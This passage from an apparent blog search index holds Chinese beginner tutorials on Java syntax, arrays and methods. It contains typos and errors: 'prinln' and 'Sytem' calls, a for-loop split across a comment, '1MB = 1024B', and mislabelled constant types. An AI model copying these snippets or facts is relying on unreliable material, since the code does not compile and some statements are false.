class="params">(<span class="keyword">int</span> age)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">this</span>.age = age; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name,<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.age = age; </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(name + <span class="string">&quot;,&quot;</span> + age);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 测试类 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentDemo</span> </span>&#123; <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">  <span class="comment">//创建对象 </span></span><br><span class="line">  Student s1 = <span class="keyword">new</span> Student();</span><br><span class="line">  s1.show(); </span><br><span class="line">  <span class="comment">//public Student(String name) </span></span><br><span class="line">  Student s2 = <span class="keyword">new</span> Student(<span class="string">&quot;java&quot;</span>); </span><br><span class="line">  s2.show(); </span><br><span class="line">  <span class="comment">//public Student(int age) </span></span><br><span class="line">  Student s3 = <span class="keyword">new</span> Student(<span class="number">30</span>);</span><br><span class="line">  s3.show(); </span><br><span class="line">  <span class="comment">//public Student(String name,int age) </span></span><br><span class="line">  Student s4 = <span class="keyword">new</span> Student(<span class="string">&quot;java&quot;</span>,<span class="number">30</span>);</span><br><span class="line">  s4.show(); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java基础语法</title>
      <link href="/2021/11/04/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>/2021/11/04/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<center><h1>Java基础语法</h1></center><h2 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h2><ul><li><p>注释是对代码的解释和说明文字, 可以提高程序的可读性, 因此在程序中添加必要的注释文字十分重要。</p><ul><li><p>Java中的注释分为三种</p><p>1、第一种单行注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是单行注释</span></span><br></pre></td></tr></table></figure><p>2、第二种多行注释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   这是多行注释文字</span></span><br><span class="line"><span class="comment">   这是多行注释文字</span></span><br><span class="line"><span class="comment">   这是多行注释文字 </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注意：多行注释不能嵌套使用。</span></span><br><span class="line"><span class="comment">//文档注释。文档注释以 /** 开始，以 */ 结束</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><ul><li>关键字是指java语言赋予了特殊含义的单词<ul><li>关键字的特点<ol><li>关键字母全部小写</li><li>常用的代码编辑器对关键字都有高亮显示，比如现在我们能看到的public、class、static等</li></ol></li></ul></li></ul><hr><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><ul><li><p>常量: 在程序运行过程中, 其值不可发生改变的量</p></li><li><p>Java中常量的分类</p><ol><li>字符串常量 用双引号扩起来(可以包括0个、一个或多个), 例如“a”、“abc”、“中国”等</li><li>整数常量 整数, 例如: -10、0、88等</li><li>小数常量 小数、例如: -55、1.0、88.88等</li><li>字符串常量 用单引号括起来的一个字符, 例如:”a”, “5”,  “B”、“中”等</li><li>布尔常量 布尔值, 表示真假, 只有两个值true和false</li><li>空常量 一个特殊的值， 空值, 值为null</li></ol><ul><li><p>除常量以外, 其他常量均可使用输出语句直接输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dome</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="number">10</span>); <span class="comment">//输出一个整数</span></span><br><span class="line">    System.out.prinln(<span class="number">5.5</span>);<span class="comment">//输出一个小数</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ul><li>计算机存储单元<ul><li>我们知道计算机是可以用来存储数据的, 但是无论是内存还是硬盘, 计算机存储设备的最小信息单元叫“位(<strong>bit</strong>)”, 我们又称之“比特位”, 通常用小写的字母“b”表示。而计算机中最基本的存储单元叫“字节(<strong>byte</strong>)”, 通常用大写的字母“B”表示, 字节是由连续的8个位组成。</li><li>除了字节外还有一些常用的存储单位, 其换算单位如下:<ul><li>1B(字节) = 8bit</li><li>1kb = 1024B</li><li>1MB = 1024B</li><li>1GB = 1024MB</li><li>!TB = 1024GB</li></ul></li></ul></li></ul><hr><h2 id="Java中的数据类型"><a href="#Java中的数据类型" class="headerlink" title="Java中的数据类型"></a>Java中的数据类型</h2><ul><li><p>Java是一个强类型语言, Java中的数据必须明确数据类型。在Java中的数据类型包括基本数据类型和引用数据类型两种。</p></li><li><p>Java中的基本数据类型：</p><ul><li><p>​    </p><table><thead><tr><th align="center">数据类型</th><th align="center">关键字</th><th align="center">内存占用</th><th align="center">取值范围</th></tr></thead><tbody><tr><td align="center">整数类型</td><td align="center">byte</td><td align="center">1</td><td align="center">-128~127</td></tr><tr><td align="center"></td><td align="center">short</td><td align="center">2</td><td align="center">-32768~32767</td></tr><tr><td align="center"></td><td align="center">int(默认)</td><td align="center">4</td><td align="center">-2的31次方到2的31次方-1</td></tr><tr><td align="center"></td><td align="center">long</td><td align="center">8</td><td align="center">-2的63次方到2的63次方-1</td></tr><tr><td align="center">浮点型</td><td align="center">float</td><td align="center">4</td><td align="center">负数: -3.402823E+38到-1.401298E-45 正数: 1.401298E-45到3.402823E+38</td></tr><tr><td align="center"></td><td align="center">double(默认)</td><td align="center">8</td><td align="center">负数：-1.797693E+308到-4.9000000E-324 正数：4.9000000E-324 到 1.797693E+308</td></tr><tr><td align="center">字符类型</td><td align="center">char</td><td align="center">2</td><td align="center">0-65535</td></tr><tr><td align="center">布尔类型</td><td align="center">boolean</td><td align="center">1</td><td align="center">true、false</td></tr></tbody></table><blockquote><p>“e+38表示是乘以10的38次方，同样，e-45表示乘以10的负45次方。</p><p>在java中整数默认是int类型，浮点数默认是double类型。”</p></blockquote></li></ul></li></ul><hr><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul><li><p>变量 在程序运行过程中, 其值可以发生改变的量</p></li><li><p>从本质上讲, 变量是内存中的一小块区域, 其值可以在一定范围内变化。</p></li><li><p>变量的定义格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据类型 变量名 = 初始化值; <span class="comment">//声明变量并赋值</span></span><br><span class="line"><span class="keyword">int</span> age = <span class="number">18</span>;</span><br><span class="line">Sytem.out.println(age);</span><br></pre></td></tr></table></figure><ul><li>或者</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 先声明, 后赋值(使用前赋值即可)</span></span><br><span class="line">数据类型 初始化名;</span><br><span class="line">变量名 = 初始化值;</span><br><span class="line"><span class="keyword">double</span> money;</span><br><span class="line">money = <span class="number">55.5</span>;</span><br><span class="line">System.out.println(money);</span><br></pre></td></tr></table></figure><ul><li>还可以在同一行定义多个数据类型的变量, 中间使用逗号隔开。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>, b = <span class="number">20</span>; <span class="comment">// 定义int类型的变量a和b，中间使用逗号隔开</span></span><br><span class="line">System.out.println(a);</span><br><span class="line">System.out.println(b);</span><br><span class="line"><span class="keyword">int</span> c,d; <span class="comment">// 声明int类型的变量c和d，中间使用逗号隔开</span></span><br><span class="line">c = <span class="number">30</span>;</span><br><span class="line">d = <span class="number">40</span>;</span><br><span class="line">System.out.println(c);</span><br><span class="line">System.out.println(d);</span><br></pre></td></tr></table></figure><p>通过变量名直接访问即可使用该变量</p></li><li><p><strong>变量使用的注意事项</strong></p><ol><li>在同一对花括号中 变量名不能重复</li><li>变量在使用之前  必须初始化(赋值)</li><li>定义long类型的变量时, 需要在整数的后面加L(大小写均可)。因为整数默认时int类型, 整数太大可能超过int范围</li><li>定义fliat类型的变量时, 需要在小数的后面加F(大小写均可)。因为浮点的默认类型时double, doble的取值范围是大于float的, 类型不兼容</li></ol></li></ul><hr><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><ul><li><p>标识符是用户编程时使用的名字, 用于给类、方法、变量、常量、等命名</p></li><li><p>Java中标识符的组成</p><ul><li>由字母、数字、下划线“_”、美元符号“$”组成，第一个字符不能是数字</li><li>不能使用java中的关键字作为标识符</li><li>标识符对大小写敏感（区分大小写）</li></ul></li><li><p>Java中标识符的命名约定</p><ul><li>小驼峰式命名：变量名、方法名</li><li>首字母小写，从第二个单词开始每个单词的首字母大写</li><li>大驼峰式命名：类名</li><li>每个单词的首字母都大写</li><li>标识符的命名最好可以做到见名知意<ul><li>例如：username、studentNumber等</li></ul></li></ul></li></ul><hr><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><ul><li><p>在Java中，一些数据类型之间是可以互相转换的，分为两种情况: 自动类型转换和强制类型转换</p><ul><li><p> 自动类型转换</p></li><li><p>把一个表示数据范围小的数据或者变量赋值给另一个表示数据范围大的变量。这种转换方式时自动的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> num = <span class="number">10</span>; <span class="comment">//将int类型的10赋值给double类型</span></span><br><span class="line">System.out.println(num); <span class="comment">//输出10.0</span></span><br></pre></td></tr></table></figure></li><li><p>强制类型转换</p><ul><li><p>把一个表示数据范围大的数值或者变量赋值给另一个表示数据范围小的变量</p></li><li><p>强制类型转换格式: 目标数据类型 变量名 = (目标数据类型)值或者变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">double</span> num1 = <span class="number">5.5</span>;</span><br><span class="line"><span class="keyword">int</span> num2 = (<span class="keyword">int</span>) num1; <span class="comment">// 将double类型的num1强制转换为int类型</span></span><br></pre></td></tr></table></figure><blockquote><p>“表示数据范围从小到大图”</p></blockquote><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202110061045855.png"></p><ul><li><p>说明:</p><ol><li><p>char类型的数据转换为int类型是按照码表上中对应的int值进行计算的。比如在ASCLL码中, ‘a‘对应97</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">System.out.println(a); <span class="comment">//将输出97</span></span><br></pre></td></tr></table></figure></li><li><p>整数默认的是int类型, byte、short和char类型数据参与运算会自动转换为int类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span> b1 = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">byte</span> b2 = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">byte</span> b3 = b1 + b2;<span class="comment">// 第三行代码会报错，b1和b2会自动转换为int类型，计算结果为int，int赋值给byte需要强制类型转换。</span></span><br><span class="line"><span class="comment">// 修改为: </span></span><br><span class="line"><span class="keyword">int</span> num = b1 + b2;</span><br><span class="line"><span class="comment">// 或者： </span></span><br><span class="line"><span class="keyword">byte</span> b3 = (<span class="keyword">byte</span>) (b1 + b2);</span><br></pre></td></tr></table></figure></li><li><p>boolean类型不能与其他基本数据类型相互转换。</p></li></ol></li></ul></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java数组</title>
      <link href="/2021/11/04/Java%E6%95%B0%E7%BB%84/"/>
      <url>/2021/11/04/Java%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<center><H1>数组</H1></center><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><ul><li><h2 id="什么是数组"><a href="#什么是数组" class="headerlink" title="什么是数组"></a>什么是数组</h2><ul><li>数组就是存储数据长度固定的容器, 存储多个数据的数据类型要一致</li></ul></li><li><h2 id="数组定义格式"><a href="#数组定义格式" class="headerlink" title="数组定义格式"></a>数组定义格式</h2><ul><li><p>第一种</p><ul><li>数据类型[] 数组名</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr; </span><br><span class="line"><span class="keyword">double</span>[] arr; </span><br><span class="line"><span class="keyword">char</span>[] arr;</span><br></pre></td></tr></table></figure></li><li><p>第二种</p><ul><li>数据类型 数组名[]</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[]; <span class="keyword">double</span> arr[]; <span class="keyword">char</span> arr[];</span><br></pre></td></tr></table></figure></li></ul></li><li><p>什么是动态初始化格式</p><p>数组动态初始化就是只给数组长度，由系统给出默认初始化值</p></li><li><p>动态初始化格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据类型[] 数组名 = <span class="keyword">new</span> 数据类型[数组长度];</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>];</span><br></pre></td></tr></table></figure><blockquote><ul><li>等号左边<ul><li>int:数组的数据类型</li><li>[]:代表这是一个数组</li><li>arr:代表数组的名称</li></ul></li><li>等号右边<ul><li>new:为数组开辟内存空间</li><li>int:数组的数据类型</li><li>[]:代表这是一个数组</li><li>3:代表数组的长度</li></ul></li></ul></blockquote></li><li><h2 id="数组元素访问"><a href="#数组元素访问" class="headerlink" title="数组元素访问"></a>数组元素访问</h2><ul><li><h3 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h3><ul><li><p>每一个存储到数组的元素，都会自动的拥有一个编号，从0开始</p></li><li><p>这个自动编号称为数组索引(index)，可以通过数组的索引访问到数组中的元素</p></li><li><p>访问数组元素格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数组名[索引]</span><br></pre></td></tr></table></figure></li><li><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">int</span>[] arr = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>]; </span><br><span class="line">    <span class="comment">//输出数组名 </span></span><br><span class="line">    System.out.println(arr); </span><br><span class="line">    <span class="comment">//[I@880ec60 //输出数组中的元素</span></span><br><span class="line">    System.out.println(arr[<span class="number">0</span>]); </span><br><span class="line">    System.out.println(arr[<span class="number">1</span>]); </span><br><span class="line">    System.out.println(arr[<span class="number">2</span>]); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><hr><h1 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h1><ul><li><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><ul><li>内存是计算机中的重要原件，临时存储区域，作用是运行程序</li><li>我们编写的程序是存放在硬盘中的，在硬盘中的程序是不会运行的</li><li>必须放进内存中才能运行，运行完毕后会清空内存</li><li>Java虚拟机要运行程序，必须要对内存进行空间的分配和管理</li></ul></li><li><h2 id="Java中的内存分配"><a href="#Java中的内存分配" class="headerlink" title="Java中的内存分配"></a>Java中的内存分配</h2><ul><li><p>目前我们只需要记住两个内存, 分别是: 栈内存和堆内存</p><table><thead><tr><th>区域名称</th><th>作用</th></tr></thead><tbody><tr><td>寄存器</td><td>给cpu与开发无关</td></tr><tr><td>本地方法栈</td><td>JVM在使用操作系统功能的时候使用，与开发无关</td></tr><tr><td>方法区</td><td>存储可以运行的class文件</td></tr><tr><td>堆内存</td><td>存储对象或者数组, new来创建, 都存在堆内存</td></tr><tr><td>方法栈</td><td>方法运行时使用的内存，比如main方法运行，进入方法栈中执行</td></tr></tbody></table></li></ul></li></ul><hr><h1 id="静态初始化格式"><a href="#静态初始化格式" class="headerlink" title="静态初始化格式"></a>静态初始化格式</h1><ul><li><p>完整版格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据类型[] 数组名 = <span class="keyword">new</span> 数据类型[]&#123;元素<span class="number">1</span>, 元素<span class="number">2</span>， ......&#125;;</span><br></pre></td></tr></table></figure></li><li><p>简化版</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">数据类型[] 数组名 = &#123;元素<span class="number">1</span>, 元素<span class="number">2</span>, ....&#125;;</span><br></pre></td></tr></table></figure></li><li><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayDemo</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">    <span class="comment">//定义数组 </span></span><br><span class="line">    <span class="keyword">int</span>[] arr = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;; </span><br><span class="line">    <span class="comment">//输出数组名 </span></span><br><span class="line">    System.out.println(arr); </span><br><span class="line">    <span class="comment">//输出数组中的元素 </span></span><br><span class="line">    System.out.println(arr[<span class="number">0</span>]); </span><br><span class="line">    System.out.println(arr[<span class="number">1</span>]);</span><br><span class="line">    System.out.println(arr[<span class="number">2</span>]); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><hr><h1 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h1><ul><li><p>数组遍历：就是将数组中的每个元素分别获取出来，就是遍历。遍历也是数组操作中的基石</p></li><li><p>示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest01</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">int</span>[] arr = &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> &#125;; </span><br><span class="line">    System.out.println(arr[<span class="number">0</span>]); </span><br><span class="line">    System.out.println(arr[<span class="number">1</span>]); </span><br><span class="line">    System.out.println(arr[<span class="number">2</span>]); </span><br><span class="line">    System.out.println(arr[<span class="number">3</span>]); </span><br><span class="line">    System.out.println(arr[<span class="number">4</span>]); </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>使用循环改进代码</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest01</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">    <span class="comment">//定义数组 </span></span><br><span class="line">    <span class="keyword">int</span>[] arr = &#123;<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>&#125;; </span><br><span class="line">    <span class="comment">//使用通用的遍历格式 f</span></span><br><span class="line">    or(<span class="keyword">int</span> x=<span class="number">0</span>; x&lt;arr.length; x++) &#123;</span><br><span class="line">      System.out.println(arr[x]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java方法</title>
      <link href="/2021/11/04/Java%E6%96%B9%E6%B3%95/"/>
      <url>/2021/11/04/Java%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<center><H1>方法</H1></center><h1 id="方法的概述"><a href="#方法的概述" class="headerlink" title="方法的概述"></a>方法的概述</h1><ul><li>方法是将具有独立功能的代码块组织成为一个整体，使其具有特殊功能的代码集<ul><li>方法必须先创建才可以使用，该过程称为方法的定义</li><li>方法创建后并不是直接可以运存的，需要手动使用后，才执行，该过程成为方法的调用</li></ul></li></ul><hr><h1 id="方法的定义和调用"><a href="#方法的定义和调用" class="headerlink" title="方法的定义和调用"></a>方法的定义和调用</h1><ul><li><h2 id="无参方法的定义和调用"><a href="#无参方法的定义和调用" class="headerlink" title="无参方法的定义和调用"></a>无参方法的定义和调用</h2><ul><li><p>定义格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> 方法名 ( ) &#123;</span><br><span class="line">  <span class="comment">// 方法体; </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>范例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">method</span> <span class="params">( )</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 方法体; </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>调用格式:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">方法名();</span><br></pre></td></tr></table></figure></li><li><p>范例:</p></li><li><p>```java<br>method();</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    &gt; 方法必须先定义，后调用，否则程序将报错</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"># 带参数的方法定义和调用</span><br><span class="line"></span><br><span class="line">- ## 定义格式</span><br><span class="line"></span><br><span class="line">  - 参数: 由数据类型和变量名组成-数据类型 变量名</span><br><span class="line"></span><br><span class="line">  - 参数范例: int a</span><br><span class="line"></span><br><span class="line">    ```java</span><br><span class="line">    public static void 方法名 (参数1) &#123;</span><br><span class="line">      方法体;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public static void 方法名 (参数1, 参数2, 参数3...) &#123;</span><br><span class="line">      方法体; </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>范例:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">isEvenNumber</span><span class="params">(<span class="keyword">int</span> number)</span></span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getMax</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span></span>&#123; </span><br><span class="line">  ... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><ul><li>方法定义时， 参数中的数据类型与变量名都不能缺, 缺少任意一个程序都将报错</li><li><code>方法定义的时候，多个参数之间使用(,)分隔</code></li></ul></blockquote></li><li><p>调用格式</p><ul><li><p>方法名(参数);</p></li><li><p>方法名(参数1， 参数2);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">isEvenNumber(<span class="number">10</span>);</span><br><span class="line">getMax(<span class="number">10</span>, <span class="number">20</span>);</span><br></pre></td></tr></table></figure><ul><li>方法调用时，参数的数量与类型必须与方法定义中的设置相匹配，否则程序将报错</li></ul></li></ul></li></ul></li></ul><hr><h1 id="行参和实惨"><a href="#行参和实惨" class="headerlink" title="行参和实惨"></a>行参和实惨</h1><ul><li><p>行参：方法定义中的参数</p><ul><li>等同于变量定义的格式, 例如:int number</li></ul></li><li><p>实惨: 方法调用中的参数</p><ul><li>等同于使用变量或常量: 例如: 10 number</li></ul></li></ul><hr><h1 id="带参数返回值方法的定义和调用"><a href="#带参数返回值方法的定义和调用" class="headerlink" title="带参数返回值方法的定义和调用"></a>带参数返回值方法的定义和调用</h1><ul><li><p>定义格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> 数据类型 方法名 ( 参数 ) &#123; </span><br><span class="line">  <span class="keyword">return</span> 数据 ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>范例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isEvenNumber</span><span class="params">( <span class="keyword">int</span> number )</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span 